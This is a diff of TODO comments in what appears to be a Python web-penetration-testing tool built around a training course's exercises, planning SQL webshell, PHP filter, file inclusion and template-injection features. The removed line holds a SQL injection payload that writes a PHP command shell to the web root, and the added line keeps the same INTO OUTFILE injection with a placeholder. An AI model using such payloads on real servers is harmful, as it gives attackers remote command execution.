@@ -19,7 +19,7 @@ from .wordlists import wordlist_strip_prefix
 # TODO: Known path should not start with slash and should end with one (if it is a dir)
 # TODO: Figure out how to recommend PHP Inclusion (LFI), SSTI or XSS based on reflection analysis
 
-# TODO: SQL webshell mode - e.g. ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+# TODO: SQL webshell mode - e.g. ' UNION SELECT "PHP SHELL", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
 #           - Test on e.g. SQL Injections Attacks - Module Exercise - VM #2 
 # TODO: PHP filters (php://filter/... and data://...)
 # TODO: Remote file inclusion? Test if we can establish a connection to a file hosted on a local webserver (run a simple web server). Or does this go in the PHP Inclusion, SSTI, and XSS category?
